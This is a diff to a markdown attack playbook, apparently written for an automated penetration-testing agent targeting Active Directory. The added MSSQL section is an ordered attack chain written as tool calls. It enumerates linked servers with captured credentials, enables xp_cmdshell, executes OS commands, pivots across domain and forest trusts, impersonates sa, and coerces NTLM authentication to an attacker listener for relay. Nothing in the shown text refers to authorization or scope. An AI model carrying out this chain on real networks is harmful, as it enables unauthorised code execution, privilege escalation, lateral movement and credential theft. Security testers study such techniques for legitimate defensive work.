@@ -79,40 +79,103 @@ When unconstrained delegation is found:
 3. Use TGT for DCSync
 ```
 
-## MSSQL Attacks
+## MSSQL Attacks (HIGH PRIORITY)
 
-### Impersonation
-When MSSQL impersonation is possible:
+MSSQL is often a path to domain compromise through linked servers that cross domain/forest trusts.
+
+### Step 1: Enumerate Linked Servers
+When you have ANY valid SQL credential (from kerberoast, password spray, etc.):
 ```
-mssql_xp_cmdshell(
+mssql_enum_linked_servers(
     target="sql.domain.com",
-    query="whoami",
-    impersonate="sa"
+    username="sql_svc",
+    password="found_password",  # pragma: allowlist secret
+    domain="DOMAIN.COM"
 )
-→ Execute as SA
+→ Find linked servers that can be pivoted through
 ```
 
-### Database-Level Impersonation (TRUSTWORTHY)
-When a database has `is_trustworthy_on=1` and db_owner/impersonate rights:
+### Step 2: Enable xp_cmdshell
+If you have sysadmin privileges:
 ```
-mssql_execute_as_user(
+mssql_enable_xp_cmdshell(
     target="sql.domain.com",
-    database="msdb",
-    query="SELECT SYSTEM_USER; EXEC sp_addsrvrolemember 'your_user','sysadmin';",
-    impersonate_user="dbo"
+    username="sa",
+    password="password",  # pragma: allowlist secret
+    domain="DOMAIN.COM"
 )
-→ Escalate to sysadmin, then use mssql_xp_cmdshell
+→ Enable command execution
 ```
 
-### Linked Servers
-When linked servers exist:
+### Step 3: Execute Commands
+After enabling xp_cmdshell:
+```
+mssql_command(
+    target="sql.domain.com",
+    username="sa",
+    password="password",  # pragma: allowlist secret
+    command="whoami /all",
+    domain="DOMAIN.COM"
+)
+→ Execute OS commands as SQL service account
+```
+
+### Step 4: Pivot Through Linked Servers
+When linked servers exist (cross-domain/forest pivoting!):
 ```
 mssql_exec_linked(
     target="sql.domain.com",
-    linked_server="remote-sql",
-    query="SELECT * FROM master..syslogins"
+    linked_server="remote-sql.otherdomain.com",
+    query="SELECT SYSTEM_USER",
+    username="sql_user",
+    password="password",  # pragma: allowlist secret
+    domain="DOMAIN.COM"
 )
-→ Execute on remote server
+→ Execute queries on remote server
+
+# Enable xp_cmdshell on linked server:
+mssql_exec_linked(
+    target="sql.domain.com",
+    linked_server="remote-sql",
+    query="EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;",
+    ...
+)
+
+# Execute commands on linked server:
+mssql_exec_linked(
+    target="sql.domain.com",
+    linked_server="remote-sql",
+    query="EXEC xp_cmdshell 'whoami /all'",
+    ...
+)
+→ Code execution across domain/forest trust!
+```
+
+### MSSQL Impersonation
+When EXECUTE AS permissions allow impersonation:
+```
+mssql_impersonate(
+    target="sql.domain.com",
+    username="low_priv_user",
+    password="password",  # pragma: allowlist secret
+    impersonate_user="sa",
+    query="SELECT SYSTEM_USER",
+    domain="DOMAIN.COM"
+)
+→ Execute as sysadmin user
+```
+
+### MSSQL NTLM Coercion
+Force SQL server to authenticate to your listener:
+```
+mssql_ntlm_coerce(
+    target="sql.domain.com",
+    username="sql_user",
+    password="password",  # pragma: allowlist secret
+    listener_ip="YOUR_IP",
+    domain="DOMAIN.COM"
+)
+→ Capture machine account hash for relay to LDAPS
 ```
 
 ## Trust Attacks
@@ -196,9 +259,12 @@ printnightmare(
 ### MSSQL Tools
 | Tool | Use Case |
 |------|----------|
-| mssql_xp_cmdshell | Execute commands |
-| mssql_enum_linked_servers | Find linked servers |
-| mssql_exec_linked | Execute on linked server |
+| mssql_enum_linked_servers | Find linked servers (run first!) |
+| mssql_enable_xp_cmdshell | Enable xp_cmdshell for command execution |
+| mssql_command | Execute OS commands via xp_cmdshell |
+| mssql_exec_linked | Execute queries/commands on linked servers |
+| mssql_impersonate | Execute as another SQL user |
+| mssql_ntlm_coerce | Force NTLM auth for relay attacks |
 
 ### CVE Tools
 | Tool | Use Case |
